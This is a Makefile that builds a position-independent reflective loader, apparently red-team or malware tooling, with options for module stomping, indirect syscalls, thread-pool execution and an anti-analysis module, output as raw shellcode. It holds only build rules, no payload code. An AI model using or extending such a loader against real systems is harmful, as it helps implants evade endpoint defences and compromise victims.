# NaX Advanced Loader Makefile
# Builds a PIC UDRL with clean-ntdll mapping + indirect syscalls.

MAKEFLAGS += -s

CC_X64   := x86_64-w64-mingw32-g++
NASM     := nasm
OBJCOPY  := x86_64-w64-mingw32-objcopy

NAX_STOMP_MODE ?= 2       # 0=VirtualAlloc, 1=ModuleStomp, 2=AlreadyLoaded
NAX_EXEC_MODE  ?= 1       # 0=CreateThread, 1=ThreadPool

CFLAGS   := -Os -fno-asynchronous-unwind-tables -nostdlib
CFLAGS   += -fno-ident -fpack-struct=8 -falign-functions=1
CFLAGS   += -s -ffunction-sections -falign-jumps=1 -w
CFLAGS   += -falign-labels=1 -fPIC
CFLAGS   += -Wl,-s,--no-seh,--enable-stdcall-fixup,-e,Start,--image-base=0x10000,--section-start,.text=0x10000
CFLAGS   += -Iinclude -masm=intel -fpermissive
CFLAGS   += -mno-sse -fno-exceptions -fno-builtin
CFLAGS   += -MMD -MP
CFLAGS   += -DNAX_STOMP_MODE=$(NAX_STOMP_MODE)
CFLAGS   += -DNAX_EXEC_MODE=$(NAX_EXEC_MODE)
NAX_NO_AA ?= 0
CFLAGS   += -DNAX_NO_AA=$(NAX_NO_AA)
NAX_DEBUG ?= 0
CFLAGS   += -DNAX_DEBUG=$(NAX_DEBUG)

C_SRCS   := src/PreMain.c src/Main.c src/Pe.c src/Syscall.c \
            src/Stomp.c src/Exec.c src/AntiAnalysis.c src/Ldr.c src/Utils.c \
            src/Dbg.c
C_OBJS   := $(patsubst src/%.c, bin/obj/naxadv_%.x64.o, $(C_SRCS))

ASM_OBJ  := bin/obj/asm_Stardust.x64.o

EXE_X64  := bin/nax_adv_loader.x64.exe
BIN_X64  := bin/nax_adv_loader.x64.bin

.PHONY: all clean

all: $(BIN_X64)

$(BIN_X64): $(EXE_X64)
	$(OBJCOPY) -O binary -j .text $(EXE_X64) $(BIN_X64)
	@echo "  BIN  $(BIN_X64)  ($$(wc -c < $(BIN_X64)) bytes)"

$(EXE_X64): $(ASM_OBJ) $(C_OBJS)
	@echo "[+] link NAX advanced loader x64"
	$(CC_X64) $(ASM_OBJ) $(C_OBJS) -o $(EXE_X64) \
	    $(CFLAGS) -Wl,-Tscripts/Linker.ld

bin/obj/naxadv_%.x64.o: src/%.c | bin/obj
	@echo "[*] compile $<"
	$(CC_X64) -c $< -o $@ $(CFLAGS)

$(ASM_OBJ): asm/x64/Stardust.asm | bin/obj
	@echo "[*] assemble $<"
	$(NASM) -f win64 $< -o $@

bin/obj:
	mkdir -p bin/obj

C_DEPS := $(C_OBJS:.o=.d)
-include $(C_DEPS)

clean:
	rm -rf bin/obj/*.o bin/obj/*.d bin/obj/*.obj bin/*.exe bin/*.bin
